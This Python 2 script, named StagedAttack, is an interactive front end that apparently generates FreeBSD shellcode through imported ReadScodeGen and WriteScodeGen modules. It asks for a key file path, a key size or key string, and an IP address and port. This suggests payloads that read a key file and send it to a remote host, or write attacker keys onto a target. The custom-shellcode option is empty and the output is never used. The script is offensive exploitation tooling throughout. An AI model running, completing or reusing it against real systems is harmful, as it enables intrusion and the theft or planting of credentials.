from ReadScodeGen  import ReadScodeGen
from WriteScodeGen import WriteScodeGen
import string

class StagedAttack():
    def __init__(self):
        pass

    def SelectShellCode(self):

        print "[+] Select ShellCode"
        print
        print "[1] Default ReadScode"
        print "[2] Default WriteScode"
        print "[9] Custom Shellcode"
        print

        while 1:
            try:
                self.ScodeType = input("Select > ")
                print

                if self.ScodeType in [1,2,9]:
                    break
                else:
                    pass
                
            except:
                print "Error"
                pass

    def InputVariable(self, varname, vartype):

        if not vartype in ["STR","INT","HEX","Y/N"]:
            return
        
        while 1:
            INP = raw_input("%s <%s> = " % (varname, vartype))

            if vartype == "STR":
                if INP != "":
                    return INP
            elif vartype == "INT":
                try:
                    return int(INP, 10)
                except:
                    pass
            elif vartype == "HEX":
                try:
                    return int(INP, 16)
                except:
                    pass
            elif vartype == "Y/N":
                if string.upper(INP) in ["Y","YES"]:
                    return True
                elif string.upper(INP) in ["N","NO"]:
                    return False

    def GenerateShellcode(self):

        print "[+] Generating Shellcode"
        print 

        if self.ScodeType == 1:
            
            KEYPATH = self.InputVariable("KEYPATH", "STR")
            KEYSIZE = self.InputVariable("KEYSIZE", "HEX")
            IPADDR  = self.InputVariable("IPADDR ", "STR")
            PORTNUM = self.InputVariable("PORTNUM", "INT")
            PLATFORM = "freebsd"
            ENCODING = self.InputVariable("ENCODING","Y/N")
            
            print 

            RSG   = ReadScodeGen(KEYPATH, KEYSIZE, IPADDR, PORTNUM, PLATFORM, ENCODING)
            SCODE = RSG.getBinScode()

        elif self.ScodeType == 2:

            KEYPATH = self.InputVariable("KEYPATH", "STR")
            KEYSTR  = self.InputVariable("KEYSTR " ,"STR")
            PLATFORM = "freebsd"
            ENCODING = self.InputVariable("ENCODING","Y/N")
            
            print

            WSG   = WriteScodeGen(KEYPATH, KEYSTR, PLATFORM, ENCODING)
            SCODE = WSG.getBinScode()
        
        elif self.ScodeType == 9:
            pass
    
    def Start(self):
        self.SelectShellCode()
        self.GenerateShellcode()

if __name__ == "__main__":
    StagedAttack().Start()
